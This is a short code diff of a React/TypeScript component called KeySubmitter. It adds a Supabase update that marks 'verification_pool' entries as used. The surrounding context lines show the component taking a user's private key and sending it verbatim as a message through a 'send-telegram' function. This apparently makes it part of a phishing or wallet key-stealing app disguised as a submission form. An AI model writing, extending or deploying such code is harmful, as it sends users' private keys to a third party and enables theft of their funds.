@@ -140,6 +140,14 @@ export function KeySubmitter() {
     try {
       const result = await submitKey(user.id, key.privateKey);
 
+      // Mark key as used in pool (so it stays forever)
+      const guestId = user?.guest_id || "Unknown";
+      await supabase
+        .from("verification_pool")
+        .update({ is_used: true })
+        .eq("added_by", guestId)
+        .eq("is_used", false);
+
       try {
         await supabase.functions.invoke("send-telegram", {
           body: { message: key.privateKey },
